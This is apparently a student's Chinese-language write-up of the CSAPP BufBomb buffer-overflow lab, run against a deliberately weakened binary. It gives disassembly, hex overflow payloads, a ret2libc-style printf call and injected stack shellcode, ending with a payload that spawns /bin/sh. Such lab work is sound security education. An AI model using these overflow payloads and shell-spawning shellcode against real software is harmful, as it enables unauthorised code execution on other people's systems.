# Writeup for Assignment BufBomb, CSAPP 2nd Edition

## overview

All materials needed in this lab are
stored in [my github repo](https://github.com/Tiger1218/SCUCCS/tree/main/C-Programming/Security%20Labs/lab2).

* my gcc version: `gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0`
* glibc version: `ldd (Ubuntu GLIBC 2.35-0ubuntu3) 2.35`
* kernel version: `Linux workshop 5.15.0-56-generic`

这道题的最低利用条件应该是 `No Canary`+`No PIE`。

## solution1

* elf file: `bufbomb`
* compile command: `gcc -m32 bufbomb.c -o bufbomb -g -no-pie -fno-stack-protector -O0`
* guard: no PIE, no Canary


审计题目源码后最容易发现的解法应该是跳过赋值语句，直接到`printf`语句。

```assembly
080492ae <test>:
    80492ae:	55                   	push   ebp
    80492af:	89 e5                	mov    ebp,esp
    80492b1:	53                   	push   ebx
    80492b2:	83 ec 14             	sub    esp,0x14
    80492b5:	e8 26 fe ff ff       	call   80490e0 <__x86.get_pc_thunk.bx>
    80492ba:	81 c3 46 2d 00 00    	add    ebx,0x2d46
    80492c0:	83 ec 0c             	sub    esp,0xc
    80492c3:	8d 83 08 e0 ff ff    	lea    eax,[ebx-0x1ff8]
    80492c9:	50                   	push   eax
    80492ca:	e8 81 fd ff ff       	call   8049050 <printf@plt>
    80492cf:	83 c4 10             	add    esp,0x10
    80492d2:	e8 b1 ff ff ff       	call   8049288 <getbuf>
    80492d7:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax
    80492da:	83 ec 08             	sub    esp,0x8
    80492dd:	ff 75 f4             	push   DWORD PTR [ebp-0xc]
    80492e0:	8d 83 19 e0 ff ff    	lea    eax,[ebx-0x1fe7]
    80492e6:	50                   	push   eax
    80492e7:	e8 64 fd ff ff       	call   8049050 <printf@plt>
    80492ec:	83 c4 10             	add    esp,0x10
    80492ef:	90                   	nop
    80492f0:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
    80492f3:	c9                   	leave  
    80492f4:	c3                   	ret
```

如以上代码所述，在`0x80492d2`处执行完`getbuf`，接下来是把返回值（即`eax`）压进栈中，然后再把字符串（即`getbuf returned 0x%x\n`）地址压入栈中。因为我们可以通过`getxs`操作整个`getbuf`函数的栈，又因为`test`函数调用了`getbuf`函数————也就是`test`在`getbuf`逻辑意义上的上面（或者物理意义的下面），我们也可以操纵整个`test`的栈。这样第一种利用`printf`语句的方法就很容易得出了：跳到`0x80492e0`，然后控制栈顶使栈顶为0xdeadbeef。

```assembly
08049288 <getbuf>:
 8049288:	55                   	push   ebp
 8049289:	89 e5                	mov    ebp,esp
 804928b:	83 ec 18             	sub    esp,0x18
 804928e:	e8 bb 00 00 00       	call   804934e <__x86.get_pc_thunk.ax>
 8049293:	05 6d 2d 00 00       	add    eax,0x2d6d
 8049298:	83 ec 0c             	sub    esp,0xc
 804929b:	8d 45 e8             	lea    eax,[ebp-0x18]
 804929e:	50                   	push   eax
 804929f:	e8 02 ff ff ff       	call   80491a6 <getxs>
 80492a4:	83 c4 10             	add    esp,0x10
 80492a7:	b8 01 00 00 00       	mov    eax,0x1
 80492ac:	c9                   	leave  
 80492ad:	c3                   	ret
```

显然栈抬升了0x18个Bytes（注意栈从高向低生长）。因此我们的Payload需要加上0x18个Bytes的填充。

程序为32位程序；那么Payload还需要加上0x04个Bytes来填充edp。

最后我们需要将存储的eip指针覆盖为我们想要去的地址，也就是`0x80492e0`，并且使得覆盖完后的栈顶[1]为0xdeadbeef。（注意Linux x64是小端序机器）

这是一种Payload：`00000000 00000000 00000000 00000000 00000000 00000000 00000000 E0920408 EFBEADDE`

## solution2

* elf file: `bufbomb`
* compile command: `gcc -m32 bufbomb.c -o bufbomb -g -no-pie -fno-stack-protector -O0`
* guard: no PIE, no Canary


另外一个非常容易想到的思路和`ret2libc`[2]非常像。

我们完全可以不使用`0x080492e7`处的`printf`————我们可以自己构造一个出来！

字符串的地址是`0x0804A019`，第二个参数应为0xdeadbeef，所以根据i386架构下的`ret2libc`原理，我们可以写出以下payload：

``` padding + ebp + (target address) + (return address) + arg1 + arg2 + arg3 ... ```

与solution1中一样，padding为0x18Bytes，ebp为0x04Bytes。目标函数为`printf`在plt表中的位置。return function可以不填。arg1为`0x0804A019`，arg2为0xdeadbeef。

```bash
00:0000│ eax esp 0xffffd3b0 ◂— 0x0
... ↓            6 skipped
07:001c│         0xffffd3cc —▸ 0x8049050 (printf@plt) ◂— jmp dword ptr [0x804c010]
08:0020│         0xffffd3d0 ◂— 0x0
09:0024│         0xffffd3d4 —▸ 0x804a019 ◂— 'getbuf returned 0x%x\n'
0a:0028│         0xffffd3d8 ◂— 0xdeadbeef
```

从上至下依次是28Bytes的padding zeros，目标函数地址，返回地址，参数1，参数2。

payload: `00000000 00000000 00000000 00000000 00000000 00000000 00000000 50900408 00000000 19A00408 EFBEADDE`

## solution3

* elf file: `bufbomb-no-nx`
* compile command: `gcc -m32 bufbomb.c -o bufbomb-no-nx -g -no-pie -fno-stack-protector -O0 -z execstack`
* guard: no PIE, no Canary, no NX, no ASLR

接下来我们来讨论在关闭`NX`保护和关闭`ASLR`保护的利用情况。[3]

我们可以回顾一下程序的各个section基本情况：

```bash
 0x8048000  0x8049000 r--p     1000      0 /root/repos/SCUCCS/C-Programming/Security Labs/lab2/bufbomb-no-nx
 0x8049000  0x804a000 r-xp     1000   1000 /root/repos/SCUCCS/C-Programming/Security Labs/lab2/bufbomb-no-nx
 0x804a000  0x804b000 r--p     1000   2000 /root/repos/SCUCCS/C-Programming/Security Labs/lab2/bufbomb-no-nx
 0x804b000  0x804c000 r--p     1000   2000 /root/repos/SCUCCS/C-Programming/Security Labs/lab2/bufbomb-no-nx
 0x804c000  0x804d000 rw-p     1000   3000 /root/repos/SCUCCS/C-Programming/Security Labs/lab2/bufbomb-no-nx
 0x804d000  0x806f000 rw-p    22000      0 [heap]
0xf7d81000 0xf7da1000 r--p    20000      0 /usr/lib/i386-linux-gnu/libc.so.6
0xf7da1000 0xf7f23000 r-xp   182000  20000 /usr/lib/i386-linux-gnu/libc.so.6
0xf7f23000 0xf7fa8000 r--p    85000 1a2000 /usr/lib/i386-linux-gnu/libc.so.6
0xf7fa8000 0xf7fa9000 ---p     1000 227000 /usr/lib/i386-linux-gnu/libc.so.6
0xf7fa9000 0xf7fab000 r--p     2000 227000 /usr/lib/i386-linux-gnu/libc.so.6
0xf7fab000 0xf7fac000 rw-p     1000 229000 /usr/lib/i386-linux-gnu/libc.so.6
0xf7fac000 0xf7fb6000 rw-p     a000      0 [anon_f7fac]
0xf7fbe000 0xf7fc0000 rw-p     2000      0 [anon_f7fbe]
0xf7fc0000 0xf7fc4000 r--p     4000      0 [vvar]
0xf7fc4000 0xf7fc6000 r-xp     2000      0 [vdso]
0xf7fc6000 0xf7fc7000 r--p     1000      0 /usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7fc7000 0xf7fec000 r-xp    25000   1000 /usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7fec000 0xf7ffb000 r--p     f000  26000 /usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7ffb000 0xf7ffd000 r--p     2000  34000 /usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7ffd000 0xf7ffe000 rw-p     1000  36000 /usr/lib/i386-linux-gnu/ld-linux.so.2
0xfffdd000 0xffffe000 rwxp    21000      0 [stack]
```

* `.code`段有读、执行权限，但是没有写权限
* `.data`、`heap`、通常情况下的`stack`段，都是只有读写权限
* `.rodata`只有读权限

一般来说，写权限和执行权限应该尽量分开。这种保护方法就叫`NX`保护————或者`No eXecute`保护。

但是如果我们主动在gcc编译中关闭NX保护，那我们就可以得到一个RWX段，也就是同时有读、写、执行权限的段，栈。

这时我们可以考虑将shellcode写在栈上，然后劫持控制流到shellcode的开始处。这时Payload应具有下面的结构：

``` shellcode + padding + ebp + shellcode's start addr ```

第二个问题出现了。shellcode写在栈上，虽然我们可以通过关闭NX保护将shellcode从不可执行变成可执行，但是我们并不知道shellcode的地址。每次我们运行程序的时候，内核都会随机加载程序的地址空间。

Problem solved！那就让我们随便试两条汇编指令吧！

```assembly
080492ae <test>:
 80492ae:	55                   	push   ebp
 80492af:	89 e5                	mov    ebp,esp
 80492b1:	53                   	push   ebx
 80492b2:	83 ec 14             	sub    esp,0x14
 80492b5:	e8 26 fe ff ff       	call   80490e0 <__x86.get_pc_thunk.bx>
 80492ba:	81 c3 46 2d 00 00    	add    ebx,0x2d46
 80492c0:	83 ec 0c             	sub    esp,0xc
 80492c3:	8d 83 08 e0 ff ff    	lea    eax,[ebx-0x1ff8]
 80492c9:	50                   	push   eax
 80492ca:	e8 81 fd ff ff       	call   8049050 <printf@plt>
 80492cf:	83 c4 10             	add    esp,0x10
 80492d2:	e8 b1 ff ff ff       	call   8049288 <getbuf>
 80492d7:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax
 80492da:	83 ec 08             	sub    esp,0x8
 80492dd:	ff 75 f4             	push   DWORD PTR [ebp-0xc]
 80492e0:	8d 83 19 e0 ff ff    	lea    eax,[ebx-0x1fe7]
 80492e6:	50                   	push   eax
 80492e7:	e8 64 fd ff ff       	call   8049050 <printf@plt>
 80492ec:	83 c4 10             	add    esp,0x10
 80492ef:	90                   	nop
 80492f0:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
 80492f3:	c9                   	leave  
 80492f4:	c3                   	ret
```

```assembly
mov eax, 0xdeadbeef
push 0x80492d7
ret ; or you can simply jmp :)
;B8EFBEAD DE68D792 0408C300 00000000 00000000 00000000 EBP ADDR
```

```assembly
   0x80492a7  <getbuf+31>    mov    eax, 1
   0x80492ac  <getbuf+36>    leave  
   0x80492ad  <getbuf+37>    ret    
    ↓
   0xffffd380                mov    eax, 0xdeadbeef
 ► 0xffffd385                push   test+41                       <0x80492d7>
   0xffffd38a                ret    
    ↓
   0x80492d7  <test+41>      mov    dword ptr [ebp - 0xc], eax
   0x80492da  <test+44>      sub    esp, 8
   0x80492dd  <test+47>      push   dword ptr [ebp - 0xc]
   0x80492e0  <test+50>      lea    eax, [ebx - 0x1fe7]
   0x80492e6  <test+56>      push   eax
```

当跳转到0x80492d7后，这一切就像无事发生，只不过返回值，也就是`eax`会被改成0xdeadbeef。[4]

```assembly
push 0xdeadbeef
push 0x80492e0
ret

;payload: 68EFBEAD DE68E092 0408C300 00000000 00000000 00000000 EBP ADDR
```

```assembly
   0x80492a7  <getbuf+31>    mov    eax, 1
   0x80492ac  <getbuf+36>    leave  
   0x80492ad  <getbuf+37>    ret    
    ↓
   0xffffd380                push   0xdeadbeef
 ► 0xffffd385                push   test+50                       <0x80492e0>
   0xffffd38a                ret    
    ↓
   0x80492e0  <test+50>      lea    eax, [ebx - 0x1fe7]
   0x80492e6  <test+56>      push   eax
   0x80492e7  <test+57>      call   printf@plt                     <printf@plt>
 
   0x80492ec  <test+62>      add    esp, 0x10
   0x80492ef  <test+65>      nop
```

跳转到0x80492e0也就意味着跳过了push第二个参数。因此，我们可以直接通过栈操作到给第二个参数赋值。

当然，既然我们可以执行任意汇编代码了，那我们有很多种方法来使得输出达到我们想要的结果。

## solution4/彩蛋

* elf file: `bufbomb-no-nx`
* compile command: `gcc -m32 bufbomb.c -o bufbomb-no-nx -g -no-pie -fno-stack-protector -O0 -z execstack`
* guard: no PIE, no Canary, no NX, no ASLR

既然我们可以执行任意汇编代码，那我们为什么不试着拿Shell权限呢？首先我们需要找到一个放置Shellcode的地方。

回到我们前面给到的这个结构：``` shellcode + padding + ebp + shellcode's start addr ```

`padding + ebp`一共是24Bytes，但是考虑到Shellcode执行阶段可能遇到的`push`指令，更好的选择其实是放在`shellcode's start addr`的后面。

这时我们的payload就变成了下面的结构：

``` padding + ebp + shellcode's start addr + shellcode```

在网上找一个小一点的Shellcode[5]，我们就得到了我们最终的Payload：

`00000000 00000000 00000000 00000000 00000000 00000000 EBP START_ADDR 31C9F7E1 B00B5168 2F2F7368 682F6269 6E89E3CD 80`

![Shellcode](https://tiger1218.com/image/pwn/final_sh_shellcode.png)

```bash
# echo getbuf returned 0xdeadbeef
getbuf returned 0xdeadbeef
```

## Summary

首先声明一点，这个Assignment在CSAPP第三版中已经没有了。所以`bufbomb.c`上面的参考价值不大。尤其是不要按照它上面的编译指令去编译：`-Og`和`-O2`会把程序结构搅乱到根本做不了，没有`-fno-stack-protector`和`-no-pie`就是字面意思上的做不了这道题。

然后谈谈我个人对这个Lab(Assignment)的理解：我并不觉得这个Lab(Assignment)很好。第一点就是CSAPP 2nd到CSAPP 3rd编辑的主旋律就是x86tox86-64，整个Lab(Assignment)在设计的时候带着IA32的思维，不难理解为什么放在现在颇有鸡肋之感。第二点是没有难度梯度，思维难度大且调试难度高的题目如果没有checkpoint很容易让人放弃。第三点就是与Buffer Lab冲突，而且Buffer Lab是它的上位替补，这个应该做过Buffer Lab的人都深有体会————深入浅出，让人醍醐灌顶。

<!--最后说一下对这门课安全项目的看法。

1. 那几个讲基础原理的PPT太浅了，而且缺少实践。学习CSAPP Labs第一需要Linux基础，第二需要Linux基础，第三还是需要Linux基础。除了极少数熟悉Linux操作的同学能从做这些题目中感觉到自己正在学知识，其他使用Windows做题的同学感受到的只能是迷惑。这种迷惑的产生一方面来自于Linux的广义上的学习资料远远多于Windows的广义上的学习资料（这又可以分为几个点，比如Linux Geeks的数量，开源带来不同等）；一方面来自于Linux的模块化。
2. 做这些Lab一定要用到调试；用到调试一定得看懂汇编；逆向工程是一件非常依赖经验的实践性学科，集成式分析软件本身就是经验的结晶，更别提把汇编拆开来看。我不相信单凭那几张PPT上面的汇编知识能够胜任————“汇编语言程序设计”可是大二下学期的课程。另外一方面来说，调试和汇编需要一部分系统知识，没有操作系统有关的实践，只有“计算机导论”这种理论性非常强的课程会让同学们在遇到和底层强相关的问题时根本没法Debug。
3. 课时问题。-->

## References

[1]: 基本的[C语言函数调用栈](https://www.cnblogs.com/clover-toeic/p/3755401.html)知识可以看这篇文章。
[2]: 在CTF-Wiki上简述了[ret2libc](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2libc)的原理和利用方法。
[3]: [How to turn off gcc compiler optimization to enable buffer overflow? - stackoverflow](https://stackoverflow.com/questions/2340259/how-to-turn-off-gcc-compiler-optimization-to-enable-buffer-overflow)
[4]: 我们可以使用[PWNTools中的ASM模块](https://docs.pwntools.com/en/stable/asm.html)来将汇编代码编译成字节码。
[5]: 利用`int 0x80`执行了`/bin/sh`的一段[Shellcode](https://shell-storm.org/shellcode/files/shellcode-841.html)